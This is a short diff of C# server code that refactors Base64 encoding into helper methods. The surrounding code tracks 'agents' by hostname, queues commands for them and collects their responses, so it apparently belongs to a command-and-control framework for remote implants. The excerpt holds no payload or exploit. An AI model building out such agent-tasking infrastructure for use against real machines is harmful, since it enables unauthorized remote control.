@@ -150,7 +150,7 @@ namespace server{
             } else if (root.TryGetProperty("response", out JsonElement response)) {
                 //get and parse a client response
                 this.agents[hostname.GetString()].commandResp.Add(response.ToString());
-                return Convert.ToBase64String(Encoding.ASCII.GetBytes("{\"response\": \"thanks\"}"));
+                return Base64Encode("{\"response\": \"thanks\"}");
             } else {
                 return HttpStatusCode.NotFound.ToString();
             }
@@ -189,6 +189,16 @@ namespace server{
             //takes in a command and formats it for the client
             return "{\"commands\": " + commands + "}";
             
+        }
+
+        private string Base64Encode(string str){
+            //takes a string and returns it in base64
+            return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
+        }
+        private string Base64Decode(string str){
+            //takes a base64 string and returns the decoded string
+            var b_base64 = Convert.FromBase64String(str);
+            return Encoding.UTF8.GetString(b_base64);
         }
 
         private void LogServer(string log){
